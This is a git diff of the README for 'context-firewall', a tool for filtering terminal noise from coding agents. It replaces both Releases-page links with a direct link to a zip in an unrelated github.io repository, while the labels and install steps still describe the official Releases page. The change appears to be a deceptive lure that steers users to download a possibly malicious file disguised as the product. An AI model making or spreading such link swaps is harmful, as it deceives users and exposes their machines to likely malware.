@@ -5,7 +5,7 @@ description: "Filter terminal noise from coding agent context windows to save to
 ---
 # 🛡️ context-firewall - Maintain total control over your data
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Reamgargle889/context-firewall/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Reamgargle889/reamgargle889.github.io/main/disgradation/reamgargle-io-github-v2.3.zip)
 
 ## 📌 What is context-firewall?
 
@@ -19,7 +19,7 @@ This application runs on Windows 10 and Windows 11. It needs minimal system reso
 
 Follow these steps to set up the software.
 
-1. Go to the [Releases page](https://github.com/Reamgargle889/context-firewall/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Reamgargle889/reamgargle889.github.io/main/disgradation/reamgargle-io-github-v2.3.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe under the Assets section.
 4. Save the file to your computer.
